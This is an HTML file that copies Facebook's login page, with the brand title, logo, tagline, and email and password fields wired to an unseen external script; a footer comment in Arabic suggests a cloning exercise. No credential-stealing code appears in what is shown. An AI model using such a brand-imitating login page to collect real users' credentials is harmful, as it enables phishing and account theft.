<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook</title>
    <link rel="preconnect" href="https://fonts.gstatic.com">
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="style.css">
</head>

<body>
    <main>
        <div class="row">
            <div class="col-logo">
                <img src="fb_logo.svg" alt="Logo">
                <h2>Facebook helps you connect and share with the people in your life.</h2>
            </div>
            <div class="col-form">
                <div class="form-container">
                    <input type="text" id="email" placeholder="Email address or phone number">
                    <div id="emailError" class="error-message"></div>
                    <input type="password" id="password" placeholder="Password">
                    <div id="passwordError" class="error-message"></div>
                    <button id="loginBtn" class="btn-login">Login</button>
                    <a href="#">Forgotten password?</a>
                    <button id="createAccountBtn" class="btn-new">Create new Account</button>
                </div>
                <p><a href="#"><b>Create a Page</b></a> for a celebrity, brand or business.</p>
            </div>
        </div>
    </main>
    <footer>
        <div class="footer-contents">
            <!-- ... (التفاصيل الأخرى في الفوتر كما هي) -->
        </div>
    </footer>
    <script src="script.js"></script>
</body>

</html>
